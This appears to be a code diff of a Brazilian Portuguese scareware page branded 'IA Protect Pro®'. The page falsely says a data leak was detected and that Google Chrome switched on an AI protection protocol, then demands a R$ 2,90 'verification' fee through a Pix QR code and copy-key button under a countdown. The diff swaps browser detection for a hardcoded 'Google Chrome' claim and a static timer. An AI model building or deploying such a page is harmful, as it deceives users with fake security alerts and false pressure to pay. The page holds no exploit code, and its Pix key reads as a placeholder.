@@ -1,98 +1,82 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>IA Protect Pro® – Varredura de Segurança</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>IA Protect Pro®</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f8f9fa;
       text-align: center;
-      padding: 40px 20px;
+      background: #fff;
+      padding: 40px;
     }
-    .cadeado {
-      font-size: 1.5em;
-      color: #f0b429;
+    .logo {
+      font-size: 24px;
+      font-weight: bold;
+      color: #f4aa00;
     }
-    .alerta {
+    .alert {
       color: red;
       font-weight: bold;
     }
-    .info {
-      margin: 15px 0;
-      font-size: 18px;
-    }
-    .bold {
-      font-weight: bold;
-    }
-    .qr {
-      margin: 20px auto;
-      width: 200px;
-    }
-    .copy-btn {
-      background-color: #e0e0e0;
+    .pix-btn {
+      margin-top: 20px;
+      padding: 12px 24px;
+      background-color: #28a745;
+      color: white;
       border: none;
-      padding: 10px 20px;
-      margin-top: 10px;
-      cursor: pointer;
       border-radius: 6px;
-      font-family: monospace;
-    }
-    .contador {
       font-size: 16px;
+      cursor: pointer;
+    }
+    .pix-btn:hover {
+      background-color: #218838;
+    }
+    .qr-code {
+      margin-top: 30px;
+      max-width: 220px;
+    }
+    .code-box {
+      margin-top: 20px;
+      background-color: #eee;
+      padding: 10px;
+      display: inline-block;
+      font-family: monospace;
+      border-radius: 4px;
+    }
+    .timer {
+      margin-top: 20px;
       color: #333;
-      margin-top: 10px;
     }
   </style>
 </head>
 <body>
-
-  <div class="cadeado">🔒 IA Protect Pro®</div>
-
+  <div class="logo">🔒 IA Protect Pro®</div>
   <h2>Segurança de conexão ativada</h2>
-  <p class="alerta">🚨 Vazamento de dados em potencial detectado.</p>
+  <p class="alert">⚠️ Vazamento de dados em potencial detectado.</p>
+  <p>O navegador <strong>Google Chrome</strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>, com tecnologia baseada em Inteligência Artificial.</p>
+  <p>Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
+  <h3>Valor único de verificação: R$ 2,90</h3>
+  <p>(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
 
-  <p class="info">O navegador <span class="bold" id="browser-name">detectando...</span> ativou automaticamente o protocolo <span class="bold">IA Protect Pro®</span>, com tecnologia baseada em Inteligência Artificial.</p>
+  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABVYAAAMACAIAAABAXKuVAACPX0lEQVR4nOzdd7gcVf348c+Zrbff5KaREEhICEkoCb03AVGqFEMoCgiGLxZEUfwpAgELiooiClIUQVRC71KV0EsIhEASQhJCEkhPbm7dNnN+fyysy5bZ2d3Z3XvvvF9Pnj" class="qr-code" alt="QR Code Pix" />
 
-  <p class="info">Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
-
-  <p class="info"><span class="bold">Valor único de verificação: R$ 2,90</span></p>
-  <p style="font-size: 13px;">(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
-
-  <img class="qr" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABVYAAAMACAIAAABAXKuVAACTK0lEQVR4nOzdd7wcVfn48efM1ttvekgIJKSQhJIQegcBUaoUITQBwfDDgiiKX0UgYEFRUURBiiKISuhduvQaSggkISQhJIH05Pa7beb8/lhYly2zs7uzu/fe+bxfeeV1d/bMOc+Und3zzJkZNX+lKQAAAAAAYKAzah0AAAAAAACoBlIAAAAAAAB4AikAAAAAAAA8gRQAAAAAAACeQAoAAAAAAABP8DspVB+UkF" alt="QR Code Pix">
-  
   <div>
-    <button class="copy-btn" onclick="copiarPix()">Copiar Chave Pix</button>
+    <button class="pix-btn" onclick="copyPix()">Copiar Chave Pix</button>
   </div>
 
-  <div class="contador">
-    ⏳ Sua autenticação expira em <span id="timer">60</span> segundos.
-  </div>
+  <div class="code-box" id="pixKey">00020126360014BR.GOV.BCB.PIX011qrfakepixkey</div>
+
+  <p class="timer">⏳ Sua autenticação expira em 59 segundos.</p>
 
   <script>
-    const navegador = navigator.userAgent;
-    const browserName = navegador.includes("Firefox") ? "Mozilla Firefox" :
-                        navegador.includes("OPR") || navegador.includes("Opera") ? "Opera" :
-                        navegador.includes("Chrome") ? "Google Chrome" :
-                        "seu navegador";
-    document.getElementById("browser-name").textContent = browserName;
-
-    let tempo = 60;
-    const timerEl = document.getElementById("timer");
-    const intervalo = setInterval(() => {
-      tempo--;
-      timerEl.textContent = tempo;
-      if (tempo <= 0) clearInterval(intervalo);
-    }, 1000);
-
-    function copiarPix() {
-      const chave = "00020126360014BR.GOV.BCB.PIX0111qrfakepixkey";
-      navigator.clipboard.writeText(chave).then(() => {
-        alert("Chave Pix copiada!");
+    function copyPix() {
+      const text = document.getElementById("pixKey").innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Chave Pix copiada com sucesso!");
       });
     }
   </script>
-
 </body>
 </html>
